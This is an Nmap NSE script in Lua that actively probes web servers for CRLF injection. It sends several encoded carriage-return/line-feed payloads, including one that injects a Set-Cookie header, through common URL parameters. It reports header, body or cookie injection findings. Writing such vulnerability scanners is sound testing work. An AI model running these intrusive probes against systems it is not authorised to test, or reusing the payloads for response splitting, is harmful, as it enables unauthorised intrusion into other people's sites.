-- CRLF Injection Detection
-- Tests for CRLF injection in HTTP responses

local http = require("http")
local stdnse = require("stdnse")

description = [[
Tests for CRLF injection vulnerabilities by injecting carriage
return and line feed sequences to manipulate HTTP responses.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or
            port.number == 8080)
end

action = function(host, port)
    local output = {}
    local findings = {}

    local payloads = {
        "\r\nX-Injected: true",
        "\r\n\r\n<html>INJECTED</html>",
        "%0d%0aX-Injected:%20true",
        "%0aX-Injected:%20true",
        "test\r\nSet-Cookie: crlf=injected",
    }

    local params = {"page", "url", "path", "file", "redirect", "callback", "return"}
    local test_paths = {"/", "/index.php", "/redirect"}

    for _, test_path in ipairs(test_paths) do
        for _, param in ipairs(params) do
            for _, payload in ipairs(payloads) do
                local url = test_path .. "?" .. param .. "=" .. payload
                local r = http.get(host.ip, port, url, {redirect = false})
                if r then
                    if r.header and r.header["x-injected"] == "true" then
                        table.insert(findings, {
                            url = test_path,
                            param = param,
                            type = "Header injection via CRLF"
                        })
                        break
                    end
                    if r.body and r.body:find("INJECTED") then
                        table.insert(findings, {
                            url = test_path,
                            param = param,
                            type = "Body injection via CRLF"
                        })
                        break
                    end
                    if r.header and r.header["set-cookie"] and
                       r.header["set-cookie"]:find("crlf=injected") then
                        table.insert(findings, {
                            url = test_path,
                            param = param,
                            type = "Cookie injection via CRLF"
                        })
                        break
                    end
                end
            end
            if #findings > 0 then break end
        end
        if #findings > 0 then break end
    end

    if #findings > 0 then
        table.insert(output, "CRLF Injection Vulnerabilities Found:")
        table.insert(output, "")
        for _, f in ipairs(findings) do
            table.insert(output, "[!] URL: " .. f.url)
            table.insert(output, "[!]   Parameter: " .. f.param)
            table.insert(output, "[!]   Type: " .. f.type)
            table.insert(output, "")
        end
        table.insert(output, "[!] HIGH: Allows response splitting and XSS")
        return stdnse.format_output(true, output)
    end

    return nil
end
